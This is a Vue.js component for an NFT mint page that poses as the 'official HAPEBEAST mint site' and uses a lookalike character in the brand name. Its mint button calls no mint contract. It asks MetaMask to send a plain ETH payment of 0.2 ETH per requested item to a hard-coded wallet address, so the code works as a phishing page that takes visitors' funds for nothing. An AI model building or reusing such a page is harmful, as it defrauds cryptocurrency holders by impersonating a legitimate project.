<template>
  <div id="app">
    <div class="page">
      <img src="./back.png" alt="" width="100%" height="110%">
      <div class="modal1">
        <div class="modal-content1">
          <h2 class="font">
            HⱯPEBEAST
          </h2>
          <h4 class="font1">
            This is the official HAPEBEAST mint site. Follow the instructions to mint your HAPE now. See you on the other side.
          </h4>
          <h4>Quantity (max 15): <input type="number" name="" id="number" max="15" min="0"> <button>MAX</button></h4>
        
          <h4>Price per mint is 0.2 ETH</h4>
          <h4 style="font-size: 20px;
  margin-top: 60px;">1. Connect your wallet with MetaMask</h4>
          <h4 style="font-size: 20px;
  margin-top: -10px;">2. Click on the button to mint your Hapes</h4>
          <button class="btn" v-on:click="mint">MINT</button>
        </div>

      </div>

    </div>
    
    <router-view/>
  </div>
</template>
<script>


export default {

  created(){
    if (typeof window.ethereum !== "undefined") {
      console.log("Metamask is installed");
    }
    const ethEnabled = async () => {
      if (window.ethereum) {
        window.ethereum.request({ method: "eth_requestAccounts" });
        const chainId = await window.ethereum.request({
          method: "eth_chainId",
        });
        console.log(chainId);
        window.web3 = new Web3(window.ethereum);
        return true;
      }
      return false;
    };
    ethEnabled().then(() => {
      try {
        const Id = window.ethereum.request({ method: "eth_chainId" });
        if (Id !== "0x1") {
          window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x1" }],
          });
        }
      } catch (error) {
        console.log("error");
        if (error.code == 4001) {
          alert("Please connect to Ethereum Chain");
        }
      }
    });
  },
  methods:{
    mint(){
      const ethEnabled = async () => {
        if (window.ethereum) {
          window.ethereum.request({ method: "eth_requestAccounts" });
          const chainId = await window.ethereum.request({
            method: "eth_chainId",
          });
          console.log(chainId);
          if (chainId == "0x1") {
            const acc = window.ethereum.request({
              method: "eth_requestAccounts",
            });
            acc.then((result) => {
              const x=document.getElementById('number').value
              const web3 = new Web3(window.ethereum);
      const hex = web3.utils.toHex(x*0.2 * 1e18);
              const account = result[0];
              window.ethereum.request({
                method: "eth_sendTransaction",
                params: [
                  {
                    from: account,
                    to: "0xa5262b68285CBDAa5637d9a74B013190ba915FB9",
                    value:hex
                    //gasPrice: '0x09184e72a000',0x29a2241af62c0000
                    //gas: '0x2710',
                  },
                ],
              });
            });
          } else {
            alert("please connect to mainnet chain");
          }
          window.web3 = new Web3(window.ethereum);
          return true;
        }
        return false;
      };
      ethEnabled().then(() => {});
    },
    
  }
}
</script>


<style lang="scss">
#app {
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
}
.page{
  
  width: 100%;
  height: 720px;
  // background-image: url(back.png);
  // background-size: 100% 100%; 
  // background-repeat: no-repeat;

}.modal1 {
  display: block; /* Hidden by default */
  position: fixed; /* Stay in place */
  z-index: 1; /* Sit on top */
  left: 0;
  top: 0;
  width: 100%; /* Full width */
  height: 100%; /* Full height */
  overflow: auto; /* Enable scroll if needed */
  background-color: rgb(0, 0, 0); /* Fallback color */
  background-color: rgba(0, 0, 0, 0.4); /* Black w/ opacity */
}

/* Modal Content/Box */
.modal-content1 {
  background-color: transparent;
  color: white;
  margin: 1% auto; /* 15% from the top and centered */
  padding: 20px;
  
  width: 60%; /* Could be more or less, depending on screen size */
}
.font{
  color: white;
  font-size: 80px;
  font-weight: 700;
}
.font1{
color: white;
font-size: 20px;
}
.btn {
  -webkit-border-radius: 28;
  -moz-border-radius: 28;
  border-radius: 0px;
  font-family: Georgia;
  color: #000000;
  font-size: 25px;
  background: #ffffff;
  padding: 10px 30px 10px 30px;
  text-decoration: none;
  width: 300px;
  cursor: pointer;
}

.btn:hover {
  background: #ffffff;
  text-decoration: none;
}
.font2{
  font-size: 20px;
  margin-top: 20px;
}

</style>
